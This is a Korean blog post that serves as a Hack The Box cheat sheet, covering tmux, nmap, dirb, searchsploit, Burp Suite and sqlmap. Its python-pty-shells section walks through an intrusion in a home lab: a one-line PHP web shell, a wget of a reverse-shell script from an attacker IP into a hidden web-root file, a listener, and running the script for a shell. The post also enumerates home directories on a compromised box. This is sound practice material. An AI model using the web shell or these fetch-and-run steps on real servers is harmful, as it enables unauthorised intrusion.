---
layout: post
title: "hack the box intro"
featured-img: hack_the_box
category: Etc
summary: tmux, nmap, searchsploit, burpsuite, python-pty-shells 
---

`hack the box`에서 자주 사용되는 도구, 명령어를 정리해놓았습니다.

## tmux
---

tmux is a terminal multiplexer: it enables a number of terminals to be created, accessed, and controlled from a single screen. tmux may be detached from a screen and continue running in the background, then later reattached.

|command| Description |
|-----------|-------------|
|tmux ls|세션 목록보기|
|tmux new -s session_name|세션 생성하며 이름 지정|
|tmux attach -t session_aname|특정 세션으로 진입하기|
|tmux kill-session -t session_name|세션 바깥에서 특정 세션을 종료|
|exit|세션 종료|


|Key|Description|
|------------|-------------|
|ctrl + b, c | 새로운 윈도우 생성|
|ctrl + b, % | 윈도우 횡 분할|
|ctrl + b, " | 윈도우 종 분할|
|ctrl + b, q | 윈도우 이동 숫자키|
|ctrl + b, arrow | 윈도우 이동 방향키|
|ctrl + b, x|세션 종료|
|ctrl + b, d|세션 빠져나오기, 세션은 유지된다. |
|ctrl + b, w|모든 윈도우 리스트 보기|
|ctrl + b, z|특정 윈도우를 전체화면으로 전환, 한번 더 누르면 원상태 복구|
|ctrl + d|윈도우 닫기|

**\# Referrence #**<br>
[http://blog.b1ue.sh/2016/10/10/tmux-tutorial/](http://blog.b1ue.sh/2016/10/10/tmux-tutorial/)


### tmux copy block
---


tmux.conf 를 만들어서 vi의 단축키를 사용할 수 있도록 설정합니다.

```console
root@kali:~/Desktop/htb/tenten# cat ~/.tmux.conf
set-window-option -g mode-keys vi
```
session 안에서 `ctrl+b+:` 입력 후 다음 명령어를 입력합니다.

```
source-file ~/.tmux.conf
```

이후 `ctrl+b+]`를 통해서 블록 지정 `space`, 복사 `enter`, 붙여넣기 `ctrl+b+]`를 할 수 있습니다.

**\# Referrence #**<br>
[jupiny.tistory.com](https://jupiny.tistory.com/entry/tmux-%EC%B0%BD%EA%B3%BC-%EC%B0%BD-%EC%82%AC%EC%9D%B4%EC%97%90%EC%84%9C-%EB%B3%B5%EB%B6%99%ED%95%98%EA%B8%B0)

## nmap
---

```bash
nmap -sC -sV -oA nmap-scripts 10.10.10.6
```

|options|Description|
|------------|-------------|
|-sC | --script default|
|-sV|Probe open ports to determine service/version info|
|-oA \<basename\> | Output in the three major formats at once(xml, nmap, gnmap)|

[https://svn.nmap.org/nmap/docs/nmap.usage.txt](https://svn.nmap.org/nmap/docs/nmap.usage.txt)

## dirb
---
DIRB is a Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary based attack against a web server and analyzing the response.

```
dirb http://10.10.10.6 -r -o tmp.dirb
```

|options|Description|
|------------|-------------|
|-r | Don't search recursively|
|-o <output_file> | Save output to disk |

[https://tools.kali.org/web-applications/dirb](https://tools.kali.org/web-applications/dirb)

## searchsploit
---
http://www.exploit-db.com 을 콘솔 환경에서 검색 할 수 있는 툴<br>
[https://www.exploit-db.com/searchsploit](https://www.exploit-db.com/searchsploit)

```bash
searchsploit afd windows local
searchsploit -t oracle windows
searchsploit -p 39446
searchsploit linux kernel 3.2 --exclude="(PoC)|/dos/"
searchsploit -x 11746.txt
```

|options|Description|
|------------|-------------|
|\-x, --examine [EDB-ID]|Examine (aka opens) the exploit using $PAGER.|


## burpsuite
---

특정한 URL만 확인할 수 있습니다.
```
target -> add to scope -> show only in-scope items
proxy -> HTTP history -> show only in-scope items
```

firefox ESR 프록시 설정
```
open menu -> preferences -> General -> Network Proxy
```

HTTP 메소드 변경
```
right click -> change requests method
```
## sqlmap
---
sqlmap -r [HTTP Request file] --level5 --risk 3

## python-pty-shells 
---

[https://github.com/infodox/python-pty-shells](https://github.com/infodox/python-pty-shells)

python 기반의 reverse-shell입니다.<br>
다음 방법은 파일업로드가 가능하거나, 임의의 파일을 쓸 수 있을 때 가능한 방법입니다.

테스트한 환경은 ubuntu 18.04에 APM을 설치하여 진행하였습니다.

1) 먼저 아래와 같은 php 구문을 업로드 또는 서버에 씁니다.

```php
<?php echo system($_REQUEST['shin']);?>
```

다음과 같이 HTTP Request를 할 수있습니다.

```
GET /shell.php?shin=ifconfig HTTP/1.1
```

2) wget을 이용하여 python 파일을 전달하기 위해 다음 명령어를 실행합니다.

```bash
python -m SimpleHTTPServer
```

3) tcp_pty_backconnect.py의 ip부분을 수정하여 다음과 같이 HTTP Request를 통해 해당 서버에 python 파일을 전달합니다.

권한문제로 정상적으로 파일을 다운받을 수 없으므로 /var/www/html의 권한을 수정하였습니다.

```
GET /shell.php?shin=wget 192.168.87.132:8000/tcp_pty_backconnect.py -O /var/www/html/uploads/.rev.py HTTP/1.1
```

4) listener를 사용하기 위해서 다음의 명령어를 사용합니다.

```
python tcp_pty_shell_handler.py -b 192.168.87.132:31337
```

5) 이후 서버에 업로드한 python 파일을 실행시키면 쉘을 얻을 수 있습니다.

```
GET /shell.php?shin=python /var/www/html/uploads/.rev.py HTTP/1.1
```

## username 확인
---
[http://man7.org/linux/man-pages/man1/find.1.html](http://man7.org/linux/man-pages/man1/find.1.html)

```bash
www-data@popcorn:/var/www/torrent/upload$find /home -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null| column -t
```

|filename|path|user|group|file permission(m)|
|------------|-------------|-------------|-------------|-------------|
|home                       | /home                                     |root  |  root   | 755|
|george                     | /home/george                              |george|  george | 755|
|.bash_logout               | /home/george/.bash_logout                 |george|  george | 644|
|.bashrc                    | /home/george/.bashrc                      |george|  george | 644|
|torrenthoster.zip          | /home/george/torrenthoster.zip            |george|  george | 644|
|.cache                     | /home/george/.cache                       |george|  george | 755|
|motd.legal-displayed       | /home/george/.cache/motd.legal-displayed  |george|  george | 644|
|.sudo_as_admin_successful  | /home/george/.sudo_as_admin_successful    |george|  george | 644|
|user.txt                   | /home/george/user.txt                     |george|  george | 644|
|.nano_history              | /home/george/.nano_history                |root  |  root   | 600|
|.mysql_history             | /home/george/.mysql_history               |root  |  root   | 600|
|.bash_history              | /home/george/.bash_history                |root  |  root   | 600|
|.profile                   | /home/george/.profile                     |george|  george | 644|

